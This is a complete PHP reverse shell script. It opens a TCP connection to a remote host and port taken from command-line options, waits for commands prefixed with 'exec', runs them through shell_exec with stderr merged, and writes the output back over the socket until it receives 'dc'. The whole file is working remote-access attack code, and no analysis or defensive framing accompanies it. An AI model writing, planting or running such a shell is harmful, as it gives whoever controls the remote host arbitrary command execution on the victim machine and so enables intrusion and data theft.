#!/usr/bin/php -q
<?php

	error_reporting(0);	// suppress warnings??

	set_time_limit(0);
	ob_implicit_flush(1);

	$short = "h:p:";
	$long  = array(
		"host:",
		"port:"
	);
	$opts  = getopt($short,$long);


	if(count($opts) < 2){
		die("Assign remote ip [-h/--host] and port [-p/--port]\n");
	}

	$addr 	= array_key_exists("host", $opts) ? trim($opts['host']) : trim($opts['h']);
	$port 	= array_key_exists("port", $opts) ? trim($opts['port']) : trim($opts['p']);

	if (($socket = socket_create(AF_INET, SOCK_STREAM, SOL_TCP)) === false) {
	     die("[\33[91m!\33[0m] socket_create() failed: reason: " .socket_strerror(socket_last_error())."\n");
	}

	echo "Connecting to [".$addr.":".$port."]...\n";

	if ((@$result = socket_connect($socket, $addr, $port)) === false){
	    die("[\33[91m!\33[0m] socket_connect failed: reason: " .socket_strerror(socket_last_error($socket))."\n");
	} 

	echo "\33[32mConnected to host [".$addr.":".$port."]\33[0m\n";

	while (true) {
	$now = date('d/m H:i:s');

	    if(($recv = socket_read($socket, 1024)) === false || $recv === "")
	    {
	    	echo "[\33[91mexit\33[0m] Empty stream..\n";
	    	break;
	    }
	    else
	    {		    	
	    	if(preg_match('/^(exec)\s/', $recv, $matches, PREG_OFFSET_CAPTURE))
	    	{
    			$full_cmd = "{ ".preg_replace('/(;)+(\s)*/', ';', trim(substr($recv, 4)));
				$full_cmd = preg_replace("(exec)", "", $full_cmd);
				$full_cmd .= substr($full_cmd, -1) !== ';' ? "; } 2>&1;" : " } 2>&1;";

				if(!($result = shell_exec($full_cmd)))
				{
					$result = "Error";
				}

				$result .= "\ncmd:: $full_cmd";

	    		if(socket_write($socket, $result, strlen($result)) === false)
	    		{	
		        	echo "\33[91mCommand not set\33[0m: ".socket_strerror(socket_last_error($socket))."\n";
		        }
	    	}

	    	else if (preg_match('/(dc)/', $recv, $matches, PREG_OFFSET_CAPTURE))
	    	{
	    		break;
	    	}

	    	else echo "[".$now. "] Server ".$addr.": ".$recv."\n";
	    }
	}
	echo "Closing socket.\n";
	socket_close($socket);
	exit(0);
?>
